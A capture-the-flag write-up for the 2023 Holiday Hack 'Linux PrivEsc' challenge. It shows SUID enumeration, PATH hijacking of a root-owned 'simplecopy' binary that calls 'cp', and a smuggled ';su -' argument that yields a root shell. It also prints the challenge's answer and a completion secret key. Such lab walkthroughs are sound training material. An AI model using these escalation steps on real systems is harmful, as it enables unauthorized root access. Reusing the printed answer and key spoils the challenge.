---
icon: material/text-box-outline
---

# Linux PrivEsc

**Difficulty**: <i class=twemoji_red>:fontawesome-solid-tree::fontawesome-solid-tree::fontawesome-solid-tree:</i>:fontawesome-solid-tree::fontawesome-solid-tree:<br/>
**Direct link**: [Linux PrivEsc](https://hhc23-wetty.holidayhackchallenge.com?&challenge=linuxpriv)

## Objective

!!! question "Request"
    Rose Mold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.

??? quote "Rose Mold"
    What am I doing in this saloon? The better question is: what planet are you from?<br/>
    Yes, I’m a troll from the Planet Frost. I decided to stay on Earth after Holiday Hack 2021 and live among the elves because I made such dear friends here.<br/>
    Whatever. Do you know much about privilege escalation techniques on Linux?<br/>
    You're asking why? How about I'll tell you why after you help me.<br/>
    And you might have to use that big brain of yours to get creative, bub.

## Hints

??? tip "Linux Privilege Escalation Techniques"
    There's [various ways](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/) to escalate privileges on a Linux system. 

??? tip "Linux Command Injection"
    Use the privileged binary to overwriting a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument.

## Solution

Logging into the system, we need to escalate our privileges so we can run a binary in the /root directory. We start checking the system to determine how best to proceed.

```cmd
elf@6dcd4737c4c8:~$ whoami
elf
elf@6dcd4737c4c8:~$ uname -a
Linux 6dcd4737c4c8 5.10.0-26-cloud-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64 x86_64 x86_64 GNU/Linux
elf@6dcd4737c4c8:~$ netstat -antup 
bash: netstat: command not found
elf@6dcd4737c4c8:~$ ps -aux | grep root
elf           14  0.0  0.0   3312   720 pts/0    S+   02:24   0:00 grep --color=auto root
```

We are logged in as "elf", the kernel version does not appear to have any readily available exploits to leverage for privilege escalation, and doesn't look like we have any running services we could take advantage of.

```cmd
elf@6dcd4737c4c8:~$ find / -perm -u=s -type f 2>/dev/null 
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy
```

This "simplecopy" I am not familiar with, so that might be worth investigating

```cmd
elf@6dcd4737c4c8:~$ ls -la /usr/bin/simplecopy
-rwsr-xr-x 1 root root 16952 Dec  2 22:17 /usr/bin/simplecopy
elf@6dcd4737c4c8:~$ simplecopy
Usage: simplecopy <source> <destination>
```

Simplecopy is owned by root though I'm not sure why we have this when we can just use "cp" to copy files. 

```cmd hl_lines="6-7"
elf@6dcd4737c4c8:~$ strings /usr/bin/simplecopy
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
...
Usage: %s <source> <destination>
cp %s %s
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
```

That's interesting that it appears simplecopy is just using "cp". Though, it's not defining the full path to "cp". Maybe we can leverage that to run what we want as root.

```cmd
elf@6dcd4737c4c8:~$ cp /bin/bash ./cp
elf@6dcd4737c4c8:~$ export PATH=.:$PATH
elf@6dcd4737c4c8:~$ simplecopy ls  
Usage: simplecopy <source> <destination>
elf@6dcd4737c4c8:~$ simplecopy ls .
/usr/bin/ls: /usr/bin/ls: cannot execute binary file
```
After copying bash to the local directory as cp, and adding the local working directory to the PATH environment variable, we can confirm that simplecopy now tries to run the arguments with bash, effectively running "bash %s %s". We can certainly pass a script to the first variable, but perhaps we can pass commands as well with the second, so we end up with something like "bash script ; second command"

```cmd hl_lines="11"
elf@6dcd4737c4c8:~$ echo "ls -la /root" > cmd
elf@6dcd4737c4c8:~$ simplecopy cmd "."
total 620
drwx------ 1 root root   4096 Dec  2 22:17 .
drwxr-xr-x 1 root root   4096 Jan  3 02:23 ..
-rw-r--r-- 1 root root   3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root    161 Dec  5  2019 .profile
-rws------ 1 root root 612560 Nov  9 21:29 runmetoanswer
elf@6dcd4737c4c8:~$ simplecopy . ";su -"
.: .: Is a directory
root@6dcd4737c4c8:~#
```

We now have root, though trying to run runmetoanswer results in an error:

```cmd
root@6dcd4737c4c8:~# ./runmetoanswer 
There is something wrong with your environment; the most likely reason is that
the RESOURCE_ID environmental variable is missing - that can happen if you're using sudo
or su or some other process that alters the environment. If this persists, please
ask for help!

The error message is: Couldn't get resource_id from the environmental variable RESOURCE_ID: environment variable not found
```

Running printenv from both elf and root does show "RESOURCE_ID" does not exist for root. 

```cmd
root@6dcd4737c4c8:~# export RESOURCE_ID=ad963c6e-15bb-44c4-84f4-c438a4795803
root@6dcd4737c4c8:~# ./runmetoanswer 
Who delivers Christmas presents?

> 
```

Looking to find the answer, I copied runmetoanswer back to /home/elf, used chown to set owner to elf:elf, and ran runmetoanswer as elf where I recieved an error pointing to /etc/runtoanswer.yaml

```cmd hl_lines="10"
oot@6dcd4737c4c8:~# cat /etc/runtoanswer.yaml 
# This is the config file for runtoanswer, where you can set up your challenge!
---

# This is the completionSecret from the Content sheet - don't tell the user this!
key: b08b538569e395f88e12ef9fe751ac39

# The answer that the user is expected to enter - case sensitive
# (This is optional - if you don't have an answer, then running this will immediately win)
answer: "santa"
```


!!! success "Answer"
```cmd
root@6dcd4737c4c8:~# ./runmetoanswer 
Who delivers Christmas presents?

> santa
Your answer: santa

Checking....
Your answer is correct!
```

## Response

!!! quote "Rose Mold"
    Yup, I knew you knew. You just have that vibe.<br/>
    To answer your question of why from earlier... Nunya!<br/>
    But, I will tell you something better, about some information I... found.<br/>
    There's a hidden, uncharted area somewhere along the coast of this island, and there may be more around the other islands.<br/>
    The area is supposed to have something on it that's totes worth, but I hear all the bad vibe toys chill there.<br/>
    That's all I got. K byyeeeee.<br/>
    Ugh... n00bs... 
